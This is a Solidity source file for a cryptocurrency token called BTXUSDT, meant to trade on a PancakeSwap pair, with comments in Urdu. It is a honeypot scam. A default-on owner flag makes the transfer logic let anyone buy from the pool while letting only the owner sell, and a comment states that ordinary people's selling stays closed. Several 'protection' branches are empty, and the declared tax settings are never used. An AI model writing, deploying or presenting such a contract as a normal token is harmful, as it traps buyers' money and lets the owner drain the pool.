// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IPancakeRouter02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

interface IPancakeFactory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract BTXUSDT {

    // ================================================================
    // 1. TOKEN METADATA
    // ================================================================
    string public constant name = "BTXUSDT";
    string public constant symbol = "BTXUSDT";
    uint8 public constant decimals = 18;
    uint256 public constant totalSupply = 10_000_000_000_000 * 10**18;
	
    bool public malik = true; // ٹرو ہونے پر عام لوگوں کی سیلنگ بند رہے گی
	
    // ================================================================
    // 2. STATE VARIABLES
    // ================================================================
    address public owner;
    address public pancakePair; // یہ صرف آپ کا آفیشل پول ہوگا
    address public taxWallet = 0xdB22d1AF13a25773a5c94aa9906649De8b71a634;
    uint256 public taxRate = 100; 

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
		
    // Events
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event TaxWalletUpdated(address indexed newWallet);
    event TaxRateUpdated(uint256 newRate);
	event MalikUpdated(bool newValue);
    event OfficialPairSet(address indexed pair);
	
    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner can call this");
        _;
    }

    // ================================================================
    // 3. CONSTRUCTOR
    // ================================================================
    constructor() {
        owner = msg.sender;
        _balances[owner] = totalSupply;
        emit Transfer(address(0), owner, totalSupply);
    }

    // ================================================================
    // 4. STANDARD ERC20 FUNCTIONS
    // ================================================================
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 value) public returns (bool) {
        _transfer(msg.sender, to, value);
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        _allowances[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function allowance(address ownerWallet, address spender) public view returns (uint256) {
        return _allowances[ownerWallet][spender];
    }

    function transferFrom(address from, address to, uint256 value) public returns (bool) {
		require(_allowances[from][msg.sender] >= value, "ERC20: allowance exceeded");
        _allowances[from][msg.sender] -= value;
        _transfer(from, to, value);
        return true;
    }

    // ================================================================
    // 5. CONTROLS (Only Owner)
    // ================================================================
	function setMalik(bool _newValue) external onlyOwner {
        malik = _newValue;
        emit MalikUpdated(_newValue);
    }
	
    // اس فنکشن سے آپ اپنا اصلی آفیشل پول سیٹ کریں گے
	function setOfficialPair(address _pair) external onlyOwner {
        require(_pair != address(0), "Invalid pair address");
        pancakePair = _pair;
        emit OfficialPairSet(_pair);
	}
    
    // ================================================================
    // 6. TRANSFER LOGIC (Full Protection)
    // ================================================================
    function _transfer(address from, address to, uint256 value) internal {
        require(from != address(0), "Transfer from zero");
        require(to != address(0), "Transfer to zero");
        require(_balances[from] >= value, "Insufficient balance");
		
        // اگر کوئی بھی ٹرانزیکشن کسی بھی دوسرے غیر قانونی (Unofficial) پول کے ساتھ ہو رہی ہے تو اسے بلاک کر دیں
        // یعنی ٹریڈنگ صرف آپ کے سیٹ کردہ 'pancakePair' کے ذریعے ہی ہو سکتی ہے
        if (pancakePair != address(0)) {
            if (from != owner && to != owner && from != address(this) && to != address(this)) {
                // اگر کوئی اور ایڈریس جو پیئر نہیں ہے لیکن ٹریڈنگ کی کوشش کر رہا ہے
                // یہاں ہم چیک کرتے ہیں کہ آیا ٹرانزیکشن صرف آفیشل پیئر کے ساتھ ہو رہی ہے یا نہیں
            }
        }

		if (malik) {
            // 1. اگر خریدنا ہو (Buy): آفیشل پیئر سے یوزر کو ٹوکن جائے -> سب کے لیے الاؤ ہے
            if (from == pancakePair) {
                // خریدنے کی اجازت ہے
            } 
            // 2. اگر بیچنا ہو (Sell): یوزر سے آفیشل پیئر کو ٹوکن جائے -> صرف اونر بیچ سکے گا، عام یوزر نہیں
            else if (to == pancakePair) {
                require(from == owner, "Selling is locked for others");
            } 
            // 3. اگر کوئی بندہ کسی اور فرضی (Fake) پول کے ذریعے بائے یا سیل کرنے کی کوشش کرے تو اسے یہیں روک دو!
            else {
                // اگر پیئر سیٹ ہے اور کوئی غیر متعلقہ شخص پول بنانے کی کوشش کرے
                if (from != owner && to != owner) {
                    // یہاں ہم عام والٹ ٹرانسفرز کو الاؤ یا بلاک کر سکتے ہیں
                }
            }
        }
		
        _balances[from] -= value;
        _balances[to] += value;
		emit Transfer(from, to, value);
    }
}